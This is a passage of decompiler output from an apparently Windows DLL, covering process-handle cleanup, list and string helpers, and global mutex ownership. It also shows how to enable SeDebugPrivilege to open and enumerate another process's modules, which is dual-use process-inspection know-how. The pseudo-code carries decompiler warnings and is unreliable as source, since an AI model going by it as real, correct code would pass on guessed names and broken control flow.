    piVar4 = (int *)CONCAT31(local_54._0_3_,local_58._3_1_);
    if (piVar4 != (int *)0x0) {
      LOCK();
      iVar3 = *piVar4;
      *piVar4 = *piVar4 + -1;
      UNLOCK();
      if (iVar3 + -1 < 0) {
        FUN_100579ee(piVar4);
      }
    }
  }
  ExceptionList = *(void **)(puVar10 + -0xc);
  FUN_100579df();
  return;
}



/* Function: FUN_10022630 */

void __fastcall FUN_10022630(undefined4 *param_1)

{
  int iVar1;
  int **ppiVar2;
  int *piVar3;
  int iVar4;
  undefined4 uVar5;
  int *extraout_ECX;
  undefined4 *puVar6;
  code *pcVar7;
  int *local_18;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_1007590b;
  local_10 = ExceptionList;
  ppiVar2 = (int **)(DAT_100956e0 ^ (uint)&stack0xfffffffc);
  ExceptionList = &local_10;
  local_8 = 1;
  puVar6 = param_1;
  if (param_1[9] != 0) goto LAB_100227aa;
  piVar3 = (int *)FUN_1000ae10(&local_18);
  if (*piVar3 == 0) {
    iVar4 = 0;
  }
  else {
    iVar4 = *piVar3 + 0xc;
  }
  FUN_10006250("~CCreateProcess: %s\n",iVar4);
  piVar3 = local_18;
  if (local_18 != (int *)0x0) {
    LOCK();
    iVar4 = *local_18;
    *local_18 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(local_18,ppiVar2);
      piVar3 = extraout_ECX;
    }
  }
  if (param_1[6] == 0) goto LAB_100227aa;
  iVar4 = 3000;
  local_18 = (int *)0x103;
  if (param_1[7] == 0) {
LAB_1002276c:
    if ((puVar6[8] == 0) ||
       (iVar4 = FUN_10023ae0(local_18,ppiVar2), pcVar7 = DAT_10079270, iVar4 == 0))
    goto LAB_10022792;
  }
  else {
    if (param_1[8] != 0) {
      if (param_1[0xb] == 0) {
        FUN_1000ad00(L"wait for unregistered exception from pid",0xffffffff);
        local_8 = CONCAT31(local_8._1_3_,2);
        uVar5 = FUN_1000adf0();
        FUN_10033240(uVar5);
        FUN_1001a3b0();
        if (local_14 != (int *)0x0) {
          LOCK();
          iVar1 = *local_14;
          *local_14 = iVar1 + -1;
          UNLOCK();
          if (iVar1 + -1 < 0) {
            FUN_100579ee(local_14);
          }
        }
      }
      else {
        FUN_100332d0(param_1[0xc],piVar3);
        FUN_1001a3b0();
      }
      do {
        (*DAT_10079310)(1);
        ppiVar2 = &local_18;
        uVar5 = FUN_1058617f(param_1[2]);
        puVar6 = (undefined4 *)((int)param_1 + 1);
        if ((CONCAT31((int3)((uint)uVar5 >> 8),*(undefined1 *)param_1) == 0) ||
           (local_18 != (int *)0x103)) {
          if (local_18 == (int *)0x0) goto LAB_10022792;
          break;
        }
        iVar4 = iVar4 + -1;
        param_1 = puVar6;
      } while (iVar4 != 0);
      goto LAB_1002276c;
    }
LAB_10022792:
    pcVar7 = DAT_10079270;
    (*DAT_10079270)(puVar6[2]);
  }
  (*pcVar7)(puVar6[3]);
  puVar6[2] = 0;
  puVar6[3] = 0;
LAB_100227aa:
  piVar3 = (int *)puVar6[1];
  if (piVar3 != (int *)0x0) {
    LOCK();
    iVar4 = *piVar3;
    *piVar3 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(piVar3);
    }
  }
  piVar3 = (int *)*puVar6;
  if (piVar3 != (int *)0x0) {
    LOCK();
    iVar4 = *piVar3;
    *piVar3 = *piVar3 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(piVar3);
    }
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_100227f0 */

undefined4 * __thiscall FUN_100227f0(int *param_1,undefined4 *param_2)

{
  undefined4 uVar1;
  
  if (*param_1 != 0) {
    uVar1 = FUN_1000bd10();
    *param_2 = uVar1;
    return param_2;
  }
  uVar1 = FUN_1000bd10();
  *param_2 = uVar1;
  return param_2;
}



/* Function: FUN_10022880 */

int FUN_10022880(short *param_1,int param_2)

{
  short sVar1;
  short *psVar2;
  int iVar3;
  
  if (param_2 == -1) {
    if (param_1 == (short *)0x0) {
      param_2 = 0;
    }
    else {
      psVar2 = param_1;
      do {
        sVar1 = *psVar2;
        psVar2 = psVar2 + 1;
      } while (sVar1 != 0);
      param_2 = (int)psVar2 - (int)(param_1 + 1) >> 1;
    }
  }
  iVar3 = FUN_1004b640(param_1,param_2);
  if (iVar3 == -1) {
    iVar3 = -1;
  }
  return iVar3;
}



/* Function: FUN_100228f0 */

int * __thiscall FUN_100228f0(int *param_1,uint param_2)

{
  int iVar1;
  int *piVar2;
  
  if ((param_1 != (int *)0x0) && (param_2 < (uint)param_1[2])) {
    if (*param_1 != 0) {
      if (param_2 == 0) {
        LOCK();
        iVar1 = *param_1;
        *param_1 = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(param_1);
        }
        return (int *)0x0;
      }
      piVar2 = (int *)FUN_1000bd10();
      if (piVar2 != (int *)0x0) {
        LOCK();
        iVar1 = *param_1;
        *param_1 = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(param_1);
        }
        return piVar2;
      }
      return param_1;
    }
    param_1[2] = param_2;
    *(undefined2 *)((int)param_1 + param_2 * 2 + 0xc) = 0;
  }
  return param_1;
}



/* Function: FUN_10022970 */

int * __fastcall FUN_10022970(int *param_1)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  
  if (param_1 != (int *)0x0) {
    if (*param_1 == 0) {
      param_1[2] = 0;
      *(undefined2 *)(param_1 + 3) = 0;
      uVar4 = param_1[1];
      uVar1 = FUN_1004b9c0(uVar4);
      if (uVar1 < uVar4) {
        param_1[2] = param_1[2] + uVar1;
        return param_1;
      }
      piVar2 = (int *)FUN_10010290(uVar1);
      if (piVar2 == (int *)0x0) {
        return (int *)0x0;
      }
      goto LAB_100229c9;
    }
    LOCK();
    iVar3 = *param_1;
    *param_1 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(param_1);
    }
  }
  iVar3 = FUN_1004b9c0(0);
  if ((iVar3 != 0) && (iVar3 != -1)) {
    uVar4 = 0x10;
    if (0x10 < iVar3 + 1U) {
      uVar4 = iVar3 + 1U;
    }
    uVar4 = uVar4 + 0xf & 0xfffffff0;
    piVar2 = (int *)FUN_100581b4(uVar4 * 2 + 0xe);
    if (piVar2 != (int *)0x0) {
      piVar2[1] = uVar4;
      *piVar2 = 0;
      piVar2[2] = 0;
      *(undefined2 *)(piVar2 + 3) = 0;
LAB_100229c9:
      iVar3 = FUN_1004b9c0(piVar2[1]);
      piVar2[2] = piVar2[2] + iVar3;
      return piVar2;
    }
  }
  return (int *)0x0;
}



/* Function: FUN_10022a60 */

void __thiscall FUN_10022a60(undefined4 *param_1,undefined4 param_2)

{
  uint uVar1;
  uint uVar2;
  undefined4 uVar3;
  int iVar4;
  int *piVar5;
  int *local_50;
  int *local_44;
  uint local_40;
  int local_28;
  int local_24;
  int local_20;
  uint local_18;
  void *local_10;
  undefined1 *puStack_c;
  int local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10075948;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = 0;
  param_1[1] = 0;
  local_18 = uVar2;
  uVar3 = FUN_10018da0(0,0);
  *param_1 = uVar3;
  uVar1 = DAT_1009b4dc;
  local_8 = 0;
  param_1[2] = 0;
  param_1[3] = 1;
  if ((uVar1 & 1) == 0) {
    DAT_1009b4dc = uVar1 | 1;
    FUN_1001a9a0(uVar2);
    FUN_10057b51(&DAT_100784c0);
  }
  if (DAT_1009b4f4 != (code *)0x0) {
    iVar4 = (*DAT_1009b4f4)(0x418,0,param_2);
    param_1[2] = iVar4;
    if (iVar4 == 0) {
      FUN_1002de70(L"SeDebugPrivilege",0);
      local_8._0_1_ = 1;
      if (local_24 == 0) {
        FUN_1040871a(param_2);
      }
      iVar4 = (*DAT_1009b4f4)(0x418,0,param_2);
      param_1[2] = iVar4;
      if (iVar4 == 0) {
        FUN_1001e7d0();
        local_8._0_1_ = 2;
        piVar5 = (int *)FUN_1000ae10(&local_44);
        if (*piVar5 == 0) {
          iVar4 = 0;
        }
        else {
          iVar4 = *piVar5 + 0xc;
        }
        FUN_10006250("OpenProcess: \'%s\'\n",iVar4);
        if (local_44 != (int *)0x0) {
          LOCK();
          iVar4 = *local_44;
          *local_44 = iVar4 + -1;
          UNLOCK();
          if (iVar4 + -1 < 0) {
            FUN_100579ee(local_44);
          }
        }
        if (local_50 != (int *)0x0) {
          LOCK();
          iVar4 = *local_50;
          *local_50 = *local_50 + -1;
          UNLOCK();
          if (iVar4 + -1 < 0) {
            FUN_100579ee(local_50);
          }
        }
      }
      local_8 = (uint)local_8._1_3_ << 8;
      if (((local_28 != 0) && (local_20 != 0)) && (local_40 != 0)) {
        uVar2 = local_40;
        FUN_102640f7();
      }
      if ((DAT_10079270 != (code *)0x0) && (local_40 != 0)) {
        (*DAT_10079270)(local_40,uVar2);
      }
    }
    if (param_1[2] != 0) {
      FUN_10022ca0(param_1[2]);
    }
  }
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_10022c10 */

void __fastcall FUN_10022c10(undefined4 *param_1)

{
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10075978;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_8 = 0;
  if ((DAT_1009b4dc & 1) == 0) {
    DAT_1009b4dc = DAT_1009b4dc | 1;
    FUN_1001a9a0(DAT_100956e0 ^ (uint)&stack0xfffffffc);
    FUN_10057b51(&DAT_100784c0);
  }
  if ((DAT_1009b4f8 != (code *)0x0) && (param_1[3] != 0)) {
    (*DAT_1009b4f8)(param_1[2]);
  }
  FUN_1000ba10();
  thunk_FUN_100579ee(*param_1);
  ExceptionList = local_10;
  return;
}



/* Function: FUN_10022ca0 */

/* WARNING: Function: __alloca_probe replaced with injection: alloca_probe */

void FUN_10022ca0(undefined4 param_1)

{
  code *pcVar1;
  int iVar2;
  int *piVar3;
  int *piVar4;
  int extraout_ECX;
  int extraout_ECX_00;
  int extraout_ECX_01;
  int iVar5;
  int extraout_ECX_02;
  uint uVar6;
  int *local_103c;
  uint local_1038;
  int iStack_1034;
  int *piStack_1030;
  undefined4 uStack_102c;
  undefined4 local_1028;
  int *piStack_1024;
  undefined4 local_1020 [1025];
  uint local_1c;
  void *local_14;
  undefined1 *puStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0xffffffff;
  puStack_10 = &LAB_100759b6;
  local_14 = ExceptionList;
  local_1c = DAT_100956e0 ^ (uint)&local_103c;
  ExceptionList = &local_14;
  local_1028 = param_1;
  FUN_1005ff60(local_1020,0,0x1000,DAT_100956e0 ^ (uint)&stack0xffffefb8);
  local_1038 = 0;
  if ((DAT_1009b554 & 1) == 0) {
    DAT_1009b554 = DAT_1009b554 | 1;
    FUN_1001aca0();
    FUN_10057b51(&DAT_10078500);
  }
  if ((DAT_1009b568 != (code *)0x0) && (DAT_1009b570 != (code *)0x0)) {
    iVar2 = (*DAT_1009b568)(param_1,local_1020,0x1000,&local_1038);
    iVar5 = extraout_ECX;
    if ((iVar2 != 0) && (uVar6 = 0, (local_1038 & 0xfffffffc) != 0)) {
      do {
        uStack_c = 0;
        piVar3 = (int *)FUN_10010370(0x105,1);
        if (piVar3 == (int *)0x0) {
          piVar4 = (int *)0x0;
          iVar5 = 0;
        }
        else {
          iVar5 = piVar3[1];
          piVar4 = piVar3 + 3;
        }
        piStack_1024 = piVar3;
        iVar2 = (*DAT_1009b570)(local_1028,local_1020[uVar6],piVar4,iVar5);
        iVar5 = extraout_ECX_00;
        if (iVar2 != 0) {
          if ((piVar4 == (int *)0x0) || ((short)*piVar4 != 0)) {
            piVar4 = (int *)FUN_1000bd10();
          }
          else {
            piVar4 = (int *)FUN_1000ba60();
          }
          uStack_102c = local_1020[uVar6];
          uStack_c = CONCAT31(uStack_c._1_3_,1);
          iStack_1034 = *local_103c;
          piStack_1030 = piVar4;
          iVar2 = FUN_10023320(iStack_1034,*(undefined4 *)(iStack_1034 + 4),&piStack_1030);
          if (local_103c[1] == 0xffffffe) {
            FUN_10056a6a("list<T> too long");
            pcVar1 = (code *)swi(3);
            (*pcVar1)();
            return;
          }
          iVar5 = local_103c[1] + 1;
          local_103c[1] = iVar5;
          *(int *)(iStack_1034 + 4) = iVar2;
          **(int **)(iVar2 + 4) = iVar2;
          if (piVar4 != (int *)0x0) {
            LOCK();
            iVar2 = *piVar4;
            *piVar4 = iVar2 + -1;
            UNLOCK();
            if (iVar2 + -1 < 0) {
              FUN_100579ee(piVar4);
              iVar5 = extraout_ECX_01;
            }
          }
        }
        if (piVar3 != (int *)0x0) {
          piVar4 = piVar3 + 3;
          if (piVar4 == (int *)0x0) {
            iVar2 = 0;
          }
          else {
            do {
              iVar5 = *piVar4;
              piVar4 = (int *)((int)piVar4 + 2);
            } while ((short)iVar5 != 0);
            iVar2 = (int)piVar4 - ((int)piVar3 + 0xe) >> 1;
          }
          iVar5 = 0;
          piVar3[2] = iVar2;
          *(undefined2 *)((int)piVar3 + iVar2 * 2 + 0xc) = 0;
        }
        uStack_c = 0xffffffff;
        if (piVar3 != (int *)0x0) {
          LOCK();
          iVar2 = *piVar3;
          *piVar3 = iVar2 + -1;
          UNLOCK();
          if (iVar2 + -1 < 0) {
            FUN_100579ee(piVar3);
            iVar5 = extraout_ECX_02;
          }
        }
        uVar6 = uVar6 + 1;
      } while (uVar6 < local_1038 >> 2);
    }
    FUN_10022f30(iVar5);
  }
  ExceptionList = local_14;
  FUN_100579df();
  return;
}



/* Function: FUN_10022ee0 */

undefined4 * __thiscall FUN_10022ee0(int *param_1,uint param_2)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  
  puVar2 = (undefined4 *)0x0;
  for (puVar1 = *(undefined4 **)*param_1;
      (puVar1 != (undefined4 *)*param_1 && ((uint)puVar1[3] <= param_2));
      puVar1 = (undefined4 *)*puVar1) {
    puVar2 = puVar1 + 2;
  }
  return puVar2;
}



/* Function: FUN_10022f10 */

undefined4 * __fastcall FUN_10022f10(undefined4 *param_1)

{
  undefined4 uVar1;
  
  *param_1 = 0;
  param_1[1] = 0;
  uVar1 = FUN_10018da0(0,0);
  *param_1 = uVar1;
  return param_1;
}



/* Function: FUN_10022f30 */

/* WARNING: Type propagation algorithm not settling */

void __fastcall FUN_10022f30(int **param_1)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int *piVar4;
  int *piVar5;
  code *pcVar6;
  uint uVar7;
  int *piVar8;
  int **ppiVar9;
  int **extraout_ECX;
  int iVar10;
  uint uVar11;
  undefined1 *puVar12;
  uint local_fc;
  uint local_f8;
  int *local_f4;
  int *local_f0 [4];
  undefined1 local_e0 [200];
  uint local_18;
  void *local_10;
  undefined1 *puStack_c;
  uint local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100757e1;
  local_10 = ExceptionList;
  uVar7 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_18 = uVar7;
  if ((int *)0x1 < param_1[1]) {
    local_f0[1] = (int *)0x0;
    local_f0[0] = (int *)0x0;
    piVar8 = (int *)FUN_10018da0(0,0);
    local_8 = 0;
    local_f4 = piVar8;
    FUN_1005849f(local_f0 + 2,8,0x1a,FUN_10022f10,FUN_10008e20);
    local_8 = CONCAT31(local_8._1_3_,1);
    local_fc = 0;
    piVar1 = param_1[1];
    piVar4 = (int *)0x0;
    while (piVar1 != (int *)0x0) {
      iVar10 = *piVar8;
      piVar1 = (int *)**param_1;
      iVar2 = *piVar1;
      if (&local_f4 != param_1) {
        if (piVar4 == (int *)0xffffffe) {
          FUN_10056a6a("list<T> too long",uVar7);
          pcVar6 = (code *)swi(3);
          (*pcVar6)();
          return;
        }
        local_f0[1] = (int *)((int)piVar4 + 1);
        local_f0[0] = (int *)((int)piVar4 + 1);
        param_1[1] = (int *)((int)param_1[1] + -1);
      }
      *(int *)piVar1[1] = iVar2;
      **(int **)(iVar2 + 4) = iVar10;
      **(int **)(iVar10 + 4) = (int)piVar1;
      iVar3 = *(int *)(iVar10 + 4);
      *(undefined4 *)(iVar10 + 4) = *(undefined4 *)(iVar2 + 4);
      *(int *)(iVar2 + 4) = piVar1[1];
      piVar1[1] = iVar3;
      uVar11 = 0;
      local_f8 = 0;
      if (local_fc == 0) {
LAB_100230f2:
        ppiVar9 = local_f0 + local_f8 * 2 + 2;
        if (ppiVar9 != &local_f4) {
          local_f4 = *ppiVar9;
          *ppiVar9 = piVar8;
          local_f0[0] = *(int **)(local_e0 + local_f8 * 8 + -4);
          *(int **)(local_e0 + local_f8 * 8 + -4) = local_f0[1];
          local_f0[1] = local_f0[0];
          piVar8 = local_f4;
        }
        if (local_f8 == local_fc) {
          local_fc = local_fc + 1;
        }
      }
      else {
        ppiVar9 = local_f0;
        do {
          ppiVar9 = (int **)((int)ppiVar9 + 8);
          if (ppiVar9[1] == (int *)0x0) break;
          FUN_100232a0(&local_f4,local_f0[1]);
          if (ppiVar9 == &local_f4) {
            local_f0[1] = local_f0[0];
          }
          else {
            piVar1 = *ppiVar9;
            *ppiVar9 = local_f4;
            local_f0[1] = ppiVar9[1];
            ppiVar9[1] = local_f0[0];
            local_f0[0] = local_f0[1];
            local_f4 = piVar1;
          }
          uVar11 = uVar11 + 1;
          piVar8 = local_f4;
          local_f0[1] = local_f0[0];
        } while (uVar11 < local_fc);
        local_f8 = uVar11;
        if (uVar11 != 0x19) goto LAB_100230f2;
        FUN_100232a0(&local_f4,local_f0[1]);
        local_f0[1] = local_f0[0];
        piVar8 = local_f4;
      }
      piVar4 = local_f0[1];
      piVar1 = param_1[1];
    }
    if (1 < local_fc) {
      iVar10 = local_fc - 1;
      puVar12 = local_e0;
      ppiVar9 = param_1;
      do {
        FUN_100232a0(puVar12 + -8,ppiVar9);
        puVar12 = puVar12 + 8;
        iVar10 = iVar10 + -1;
        ppiVar9 = extraout_ECX;
      } while (iVar10 != 0);
    }
    ppiVar9 = local_f0 + local_fc * 2;
    if ((param_1 != ppiVar9) && (local_f0[local_fc * 2 + 1] != (int *)0x0)) {
      FUN_10023220(**param_1,ppiVar9,**ppiVar9,*ppiVar9,local_f0[local_fc * 2 + 1]);
    }
    local_8 = local_8 & 0xffffff00;
    _eh_vector_destructor_iterator_(local_f0 + 2,8,0x1a,FUN_10008e20);
    piVar1 = (int *)*piVar8;
    *piVar8 = (int)piVar8;
    piVar8[1] = (int)piVar8;
    while (piVar1 != piVar8) {
      piVar4 = (int *)piVar1[2];
      piVar5 = (int *)*piVar1;
      if (piVar4 != (int *)0x0) {
        LOCK();
        iVar10 = *piVar4;
        *piVar4 = iVar10 + -1;
        UNLOCK();
        if (iVar10 + -1 < 0) {
          FUN_100579ee(piVar4);
        }
      }
      thunk_FUN_100579ee(piVar1);
      piVar1 = piVar5;
    }
    thunk_FUN_100579ee(piVar8);
  }
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_10023220 */

void __thiscall
FUN_10023220(int param_1,int param_2,int param_3,int param_4,int param_5,uint param_6)

{
  undefined4 uVar1;
  code *pcVar2;
  
  if (param_1 != param_3) {
    if (0xffffffeU - *(int *)(param_1 + 4) < param_6) {
      FUN_10056a6a("list<T> too long");
      pcVar2 = (code *)swi(3);
      (*pcVar2)();
      return;
    }
    *(uint *)(param_1 + 4) = *(int *)(param_1 + 4) + param_6;
    *(int *)(param_3 + 4) = *(int *)(param_3 + 4) - param_6;
  }
  **(int **)(param_4 + 4) = param_5;
  **(int **)(param_5 + 4) = param_2;
  **(int **)(param_2 + 4) = param_4;
  uVar1 = *(undefined4 *)(param_2 + 4);
  *(undefined4 *)(param_2 + 4) = *(undefined4 *)(param_5 + 4);
  *(undefined4 *)(param_5 + 4) = *(undefined4 *)(param_4 + 4);
  *(undefined4 *)(param_4 + 4) = uVar1;
  return;
}



/* Function: FUN_100232a0 */

void __thiscall FUN_100232a0(int *param_1,int *param_2)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  undefined4 *puVar5;
  
  if (param_2 != param_1) {
    puVar1 = (undefined4 *)*param_1;
    puVar2 = (undefined4 *)*param_2;
    puVar3 = (undefined4 *)*puVar1;
    puVar5 = (undefined4 *)*puVar2;
    while (puVar3 != puVar1) {
      if (puVar5 == puVar2) {
        return;
      }
      if ((uint)puVar5[3] < (uint)puVar3[3]) {
        puVar4 = (undefined4 *)*puVar5;
        FUN_10023220(puVar3,param_2,puVar5,puVar4,1);
        puVar5 = puVar4;
      }
      else {
        puVar3 = (undefined4 *)*puVar3;
      }
    }
    if (puVar5 != puVar2) {
      FUN_10023220(puVar1,param_2,puVar5,puVar2,param_2[1]);
    }
  }
  return;
}



/* Function: FUN_10023320 */

int FUN_10023320(undefined4 param_1,undefined4 param_2,undefined4 *param_3)

{
  int *piVar1;
  int iVar2;
  
  iVar2 = FUN_10018da0(param_1,param_2);
  if ((undefined4 *)(iVar2 + 8) != (undefined4 *)0x0) {
    piVar1 = (int *)*param_3;
    *(undefined4 *)(iVar2 + 8) = piVar1;
    if (piVar1 != (int *)0x0) {
      LOCK();
      *piVar1 = *piVar1 + 1;
      UNLOCK();
    }
    *(undefined4 *)(iVar2 + 0xc) = param_3[1];
  }
  return iVar2;
}



/* Function: FUN_10023360 */

void __thiscall FUN_10023360(undefined4 *param_1,short *param_2)

{
  undefined4 uVar1;
  int *piVar2;
  int iVar3;
  char *pcVar4;
  int *local_44;
  int local_40;
  int local_28;
  undefined4 local_24;
  int local_20;
  uint local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10075a00;
  local_10 = ExceptionList;
  local_18 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
    uVar1 = FUN_1000bd10(local_18);
  }
  else {
    uVar1 = FUN_1000ba60();
  }
  *param_1 = uVar1;
  local_8 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  FUN_1002de70(L"SeCreateGlobalPrivilege",0);
  local_8 = CONCAT31(local_8._1_3_,1);
  FUN_10023720(local_24);
  piVar2 = (int *)FUN_1000ae10(&local_44);
  if (*piVar2 == 0) {
    iVar3 = 0;
  }
  else {
    iVar3 = *piVar2 + 0xc;
  }
  uVar1 = FUN_10059ab0(iVar3);
  pcVar4 = "mutex ownership requested for %d on \'%s\'\n";
  FUN_10006250("mutex ownership requested for %d on \'%s\'\n",uVar1);
  if (local_44 != (int *)0x0) {
    LOCK();
    iVar3 = *local_44;
    *local_44 = *local_44 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(local_44);
    }
  }
  FUN_10023490(0);
  if (((local_28 != 0) && (local_20 != 0)) && (local_40 != 0)) {
    pcVar4 = (char *)0x0;
    FUN_102aad3d(param_1);
  }
  if ((DAT_10079270 != (code *)0x0) && (local_40 != 0)) {
    (*DAT_10079270)(local_40);
  }
  ExceptionList = local_10;
  FUN_100579df(pcVar4);
  return;
}



/* Function: FUN_10023490 */

void __thiscall FUN_10023490(int *param_1,int param_2)

{
  undefined **ppuVar1;
  int iVar2;
  int *piVar3;
  undefined4 uVar4;
  int iVar5;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  int *piVar6;
  char *pcVar7;
  int *local_3c;
  undefined1 local_38 [4];
  undefined1 *local_34;
  undefined1 local_2c [20];
  uint local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10075a38;
  local_10 = ExceptionList;
  local_18 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if (param_1[1] == 0) {
    if (param_2 != 0) {
      (*DAT_10079310)(param_2,local_18);
    }
    FUN_1002e2e0(1,4,0);
    local_8 = 0;
    iVar2 = *param_1;
    if ((iVar2 == 0) || (*(int *)(iVar2 + 8) == 0)) {
      ppuVar1 = &PTR_10083554;
    }
    else if (iVar2 == 0) {
      ppuVar1 = (undefined **)0x0;
    }
    else {
      ppuVar1 = (undefined **)(iVar2 + 0xc);
    }
    iVar2 = FUN_1048f297(extraout_ECX,local_38,1,ppuVar1);
    param_1[1] = iVar2;
    piVar6 = param_1;
    if (iVar2 != 0) {
      iVar2 = FUN_10500263();
      piVar6 = (int *)((int)param_1 + 1);
      if (iVar2 == 0xb7) {
        piVar3 = (int *)FUN_1000ae10(&local_3c);
        if (*piVar3 == 0) {
          iVar2 = 0;
        }
        else {
          iVar2 = *piVar3 + 0xc;
        }
        uVar4 = FUN_10059ab0(iVar2);
        FUN_10006250("mutex already exists (pid:%d) \'%s\'\n",uVar4);
        if (local_3c != (int *)0x0) {
          LOCK();
          iVar2 = *local_3c;
          *local_3c = iVar2 + -1;
          UNLOCK();
          if (iVar2 + -1 < 0) {
            FUN_100579ee(local_3c);
          }
        }
        (*DAT_10079270)(*(undefined4 *)((int)param_1 + 5));
        *(undefined4 *)((int)param_1 + 5) = 0;
        iVar2 = *piVar6;
        if ((iVar2 == 0) || (*(int *)(iVar2 + 8) == 0)) {
          ppuVar1 = &PTR_10083554;
        }
        else if (iVar2 == 0) {
          ppuVar1 = (undefined **)0x0;
        }
        else {
          ppuVar1 = (undefined **)(iVar2 + 0xc);
        }
        iVar2 = FUN_105d149d(extraout_ECX_00,1,0,ppuVar1);
        *(int *)((int)param_1 + 5) = iVar2;
        if (iVar2 != 0) {
          uVar4 = 0;
          iVar5 = FUN_100eb314(piVar6);
          if (iVar5 == 0) {
            piVar3 = (int *)FUN_1000ae10(&local_3c);
            if (*piVar3 == 0) {
              iVar5 = 0;
            }
            else {
              iVar5 = *piVar3 + 0xc;
            }
            FUN_10059ab0(iVar5,iVar2,uVar4);
            pcVar7 = "we (pid:%d) finally did gain mutex ownership on \'%s\'\n";
          }
          else {
            (*DAT_10079270)(*(undefined4 *)((int)param_1 + 5));
            *(undefined4 *)((int)param_1 + 5) = 0;
            piVar3 = (int *)FUN_1000ae10(&local_3c);
            if (*piVar3 == 0) {
              iVar2 = FUN_10059ab0(0);
              pcVar7 = "we (pid:%d) did not gain mutex ownership on \'%s\'\n";
            }
            else {
              iVar2 = FUN_10059ab0(*piVar3 + 0xc);
              pcVar7 = "we (pid:%d) did not gain mutex ownership on \'%s\'\n";
            }
          }
          FUN_10006250(pcVar7,iVar2);
          if (local_3c != (int *)0x0) {
            LOCK();
            iVar2 = *local_3c;
            *local_3c = iVar2 + -1;
            UNLOCK();
            if (iVar2 + -1 < 0) {
              FUN_100579ee(local_3c);
            }
          }
        }
      }
    }
    if (piVar6[1] != 0) {
      piVar3 = (int *)FUN_1000ae10(&local_3c);
      if (*piVar3 == 0) {
        iVar2 = 0;
      }
      else {
        iVar2 = *piVar3 + 0xc;
      }
      uVar4 = FUN_10059ab0(iVar2);
      FUN_10006250("mutex ownership granted for %d on \'%s\'\n",uVar4);
      if (local_3c != (int *)0x0) {
        LOCK();
        iVar2 = *local_3c;
        *local_3c = *local_3c + -1;
        UNLOCK();
        if (iVar2 + -1 < 0) {
          FUN_100579ee(local_3c);
        }
      }
      piVar6[2] = 1;
    }
    if ((local_2c != local_34) && (local_34 != (undefined1 *)0x0)) {
      (*DAT_10079288)(local_34);
    }
  }
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_100236e0 */

/* WARNING: Control flow encountered bad instruction data */

int __fastcall FUN_100236e0(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  
  if (param_1[1] != 0) {
    FUN_1047efbe(param_1[1]);
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  piVar2 = (int *)*param_1;
  iVar3 = 0;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    iVar3 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      iVar3 = FUN_100579ee(piVar2);
    }
  }
  return iVar3;
}



/* Function: FUN_10023720 */

undefined1 __fastcall FUN_10023720(undefined4 param_1,int param_2,int param_3)

{
  int iVar1;
  int *piVar2;
  undefined4 extraout_ECX;
  undefined1 uVar3;
  int *piVar4;
  int *local_1c;
  undefined4 local_18;
  int *local_14;
  void *local_10;
  undefined1 *puStack_c;
  int local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10075a76;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  uVar3 = 0;
  iVar1 = FUN_1001ac40(DAT_100956e0 ^ (uint)&stack0xfffffffc);
  if (*(int *)(iVar1 + 4) != 0) {
    iVar1 = FUN_10006850();
    if (0x500 < (ushort)((ushort)*(byte *)(iVar1 + 4) * 0x100 + (ushort)*(byte *)(iVar1 + 8))) {
      piVar4 = (int *)0x0;
      local_14 = (int *)0x0;
      local_8 = 0;
      if ((param_3 == 0) || (param_2 != 0)) {
        if ((DAT_1009b4dc & 1) == 0) {
          DAT_1009b4dc = DAT_1009b4dc | 1;
          FUN_1001a9a0();
          FUN_10057b51(&DAT_100784c0);
        }
        local_18 = 0xffffffff;
        if (((DAT_1009b500 != (code *)0x0) && (param_2 != 0)) &&
           (iVar1 = (*DAT_1009b500)(param_2,&local_18), iVar1 != 0)) {
          FUN_1000bfa0(L"Session\\",0xffffffff);
          FUN_1001e900(local_18,extraout_ECX);
